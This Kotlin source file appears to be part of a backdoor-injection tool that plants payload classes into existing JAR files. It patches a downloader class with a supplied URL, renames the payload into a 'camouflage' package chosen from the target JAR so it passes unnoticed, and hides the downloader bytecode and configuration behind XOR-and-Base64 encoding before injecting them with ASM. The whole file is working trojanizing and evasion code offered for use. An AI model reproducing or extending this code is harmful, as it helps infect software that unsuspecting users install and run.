package com.tmquan2508.inject.core.payload

import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.core.analysis.JavaVersion
import com.tmquan2508.inject.core.analysis.JavaVersionScanner
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.Opcodes
import org.objectweb.asm.commons.ClassRemapper
import org.objectweb.asm.commons.SimpleRemapper
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.InsnNode
import org.objectweb.asm.tree.LdcInsnNode
import java.io.File
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.*

data class ProcessedPayload(
    val otherClasses: List<ClassFile>,
    val finalMainPayloadName: String,
    val finalMainPayloadBytes: ByteArray
)

class PayloadProcessor {
    private val camouflageGenerator = Camouflage()

    private companion object {
        const val DOWNLOADER_CLASS_NAME = "com/tmquan2508/payload/FileDownloader.class"
        const val DOWNLOADER_URL_PLACEHOLDER = "::URL::"
        const val ORIGINAL_MAIN_PAYLOAD_NAME = "com/tmquan2508/exploit/Config"
        const val ORIGINAL_PACKAGE = "com/tmquan2508/exploit"
    }

    fun process(
        rawPayloadClasses: List<ClassFile>,
        camouflageEnabled: Boolean,
        targetJar: File,
        dominantVersion: JavaVersion,
        config: Config,
        configJson: String,
        downloaderUrl: String
    ): ProcessedPayload {
        val originalDownloaderBytes = this.javaClass.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
            ?: throw IllegalStateException("Could not find internal downloader class: '$DOWNLOADER_CLASS_NAME'")

        val patchedDownloaderBytes = patchDownloaderUrl(originalDownloaderBytes, downloaderUrl)

        val (relocationMap, finalMainPayloadName) = createRelocationPlan(camouflageEnabled, targetJar, rawPayloadClasses)
        val transformedBytecodeMap = transformAndRelocatePayload(rawPayloadClasses, relocationMap, dominantVersion)

        val configuredBytecodeMap = applyConfigurationWithAsm(
            originalBytecodeMap = transformedBytecodeMap,
            targetClassName = finalMainPayloadName,
            downloaderBytes = patchedDownloaderBytes,
            config = config,
            configJson = configJson
        )

        val finalMainPayloadBytes = configuredBytecodeMap[finalMainPayloadName]
            ?: throw IllegalStateException("Main payload class '$finalMainPayloadName' not found after configuration.")

        val otherClasses = configuredBytecodeMap
            .filterKeys { it != finalMainPayloadName }
            .map { (name, bytes) -> ClassFile(bytes).apply { this.name = name } }

        return ProcessedPayload(otherClasses, finalMainPayloadName, finalMainPayloadBytes)
    }

    private fun patchDownloaderUrl(originalBytes: ByteArray, newUrl: String): ByteArray {
        val classReader = ClassReader(originalBytes)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)
        var patched = false

        Logs.info(" -> Patching downloader with URL: '$newUrl'")

        for (method in classNode.methods) {
            for (insn in method.instructions) {
                if (insn is LdcInsnNode && insn.cst == DOWNLOADER_URL_PLACEHOLDER) {
                    insn.cst = newUrl
                    patched = true
                    Logs.debug("  [ASM-PATCH] Replaced downloader placeholder in ${classNode.name}")
                    break
                }
            }
            if (patched) break
        }

        if (!patched) {
            // Lỗi này nghiêm trọng hơn vì nó có nghĩa là FileDownloader.java không có placeholder
            throw IllegalStateException("Could not find URL placeholder in downloader bytecode. Make sure it's compiled with '::URL::'.")
        }

        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }

    private fun createRelocationPlan(
        camouflageEnabled: Boolean,
        targetJar: File,
        rawPayloadClasses: List<ClassFile>
    ): Pair<Map<String, String>, String> {
        if (!camouflageEnabled) {
            return Pair(emptyMap(), ORIGINAL_MAIN_PAYLOAD_NAME)
        }

        Logs.info(" -> Camouflage enabled. Generating camouflage plan...")
        val plan = camouflageGenerator.generatePlan(targetJar)
        Logs.info(" -> Selected camouflage package: '${plan.packageName}' with new base name '${plan.namePrefix}'")

        val finalMainPayloadName = "${plan.packageName}/${plan.namePrefix}"
        val newSupportPackage = "${plan.packageName}/${plan.namePrefix}Support"

        val relocationMap = rawPayloadClasses.associate { clazz ->
            val originalName = clazz.name
            val newName = when {
                originalName.startsWith("$ORIGINAL_MAIN_PAYLOAD_NAME$") || originalName == ORIGINAL_MAIN_PAYLOAD_NAME ->
                    finalMainPayloadName + originalName.substring(ORIGINAL_MAIN_PAYLOAD_NAME.length)
                originalName.startsWith(ORIGINAL_PACKAGE) ->
                    newSupportPackage + originalName.substring(ORIGINAL_PACKAGE.length)
                else -> originalName
            }
            originalName to newName
        }
        return Pair(relocationMap, finalMainPayloadName)
    }

    private fun transformAndRelocatePayload(
        rawClasses: List<ClassFile>,
        relocationMap: Map<String, String>,
        dominantVersion: JavaVersion
    ): Map<String, ByteArray> {
        if (relocationMap.isEmpty()) {
            return rawClasses.associate { it.name to it.compile() }
        }

        val remapper = SimpleRemapper(relocationMap)
        val transformedBytecode = mutableMapOf<String, ByteArray>()

        Logs.info(" -> Transforming and relocating payload classes with ASM...")
        rawClasses.forEach { classFile ->
            val originalName = classFile.name
            val newName = relocationMap[originalName] ?: originalName

            val reader = ClassReader(classFile.compile())
            val writer = ClassWriter(ClassWriter.COMPUTE_FRAMES)
            val classRemapper = ClassRemapper(writer, remapper)
            reader.accept(classRemapper, ClassReader.EXPAND_FRAMES)
            val finalBytecode = writer.toByteArray()
            JavaVersionScanner.setClassVersion(finalBytecode, dominantVersion)

            transformedBytecode[newName] = finalBytecode
            Logs.debug("  [ASM-REMAP] '${originalName}' -> '${newName}'")
        }
        return transformedBytecode
    }

    private fun applyConfigurationWithAsm(
        originalBytecodeMap: Map<String, ByteArray>,
        targetClassName: String,
        downloaderBytes: ByteArray,
        config: Config,
        configJson: String
    ): Map<String, ByteArray> {
        val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
            downloaderBytes, configJson
        )

        val mainClassBytes = originalBytecodeMap[targetClassName]
            ?: throw IllegalStateException("Configuration target class '$targetClassName' not found in transformed bytecode map.")

        val mainClassNode = ClassNode().also { ClassReader(mainClassBytes).accept(it, 0) }

        val classesToPatch = mutableSetOf(targetClassName)
        mainClassNode.innerClasses?.forEach { innerClassNode ->
            if (innerClassNode.outerName == mainClassNode.name) {
                Logs.debug("  [DISCOVERY] Found nested class: ${innerClassNode.name}")
                classesToPatch.add(innerClassNode.name)
            }
        }

        val finalBytecodeMap = mutableMapOf<String, ByteArray>()
        originalBytecodeMap.forEach { (className, originalBytes) ->
            if (className in classesToPatch) {
                Logs.debug("  [PATCH] Applying configuration to $className")
                finalBytecodeMap[className] = AsmValueInjector.inject(originalBytes, replacementMap, config.displayDebugMessages)
            } else {
                finalBytecodeMap[className] = originalBytes
            }
        }

        Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
        return finalBytecodeMap
    }

    private object AsmValueInjector {
        private val gson = Gson()

        private object StaticKeyEncoder {
            private const val SECRET_KEY = "openbd.secret.key"
            fun encrypt(plainText: String): String {
                val inputBytes = plainText.toByteArray(Charsets.UTF_8)
                val keyBytes = SECRET_KEY.toByteArray(Charsets.UTF_8)
                val outputBytes = ByteArray(inputBytes.size) { i -> (inputBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte() }
                return Base64.getEncoder().encodeToString(outputBytes)
            }
        }
        private fun generateRandomKey(length: Int): String {
            val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            return (1..length).map { chars[SecureRandom().nextInt(chars.length)] }.joinToString("")
        }

        private fun encryptWithRandomKey(plainBytes: ByteArray, key: String): String {
            val keyBytes = key.toByteArray(Charsets.UTF_8)
            val result = ByteArray(plainBytes.size) { i -> (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte() }
            return Base64.getEncoder().encodeToString(result)
        }

        fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>, debugFlag: Boolean): ByteArray {
            val classReader = ClassReader(originalBytecode)
            val classNode = ClassNode()
            classReader.accept(classNode, 0)
            classNode.methods.forEach { method ->
                method.instructions.forEach { insn ->
                    if (insn is LdcInsnNode && insn.cst is String && placeholders.containsKey(insn.cst as String)) {
                        val placeholder = insn.cst as String
                        insn.cst = placeholders[placeholder]
                        Logs.debug("  [ASM-LDC] Replaced '$placeholder' in ${classNode.name}.${method.name}")
                    }
                }

                if (debugFlag && method.name == "initialize") {
                    val instructions = method.instructions
                    for (i in 0 until instructions.size()) {
                        val insn = instructions.get(i)
                        if (insn.opcode == Opcodes.ICONST_0) {
                            Logs.debug("  [ASM-OPCODE] Replaced ICONST_0 with ICONST_1 in ${classNode.name}.${method.name}")
                            instructions.set(insn, InsnNode(Opcodes.ICONST_1))
                            break
                        }
                    }
                }
            }
            val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
            classNode.accept(classWriter)
            return classWriter.toByteArray()
        }

        fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, configJson: String): Map<String, String> {
            val finalMap = mutableMapOf<String, String>()
            val key = generateRandomKey(32)

            val downloaderClassName = DOWNLOADER_CLASS_NAME.replace(".class", "").replace('/', '.')
            finalMap["::KEY::"] = key
            finalMap["::ENCRYPTED_PAYLOAD::"] = encryptWithRandomKey(downloaderBytes, key)
            finalMap["::ENCRYPTED_DOWNLOADER_CLASS_NAME::"] = encryptWithRandomKey(downloaderClassName.toByteArray(Charsets.UTF_8), key)

            val type = object : TypeToken<MutableMap<String, Any>>() {}.type
            val configMap: MutableMap<String, Any> = gson.fromJson(configJson, type)

            (configMap["password"] as? String)?.takeIf { it.isNotEmpty() }?.let { plainPassword ->
                configMap["password"] = plainPassword.toSha256()
            }

            val processedConfigJson = gson.toJson(configMap)
            finalMap["::CONFIG::"] = StaticKeyEncoder.encrypt(processedConfigJson)

            return finalMap
        }
    }
}

private fun String.toSha256(): String = MessageDigest.getInstance("SHA-256")
    .digest(this.toByteArray())
    .joinToString("") { "%02x".format(it) }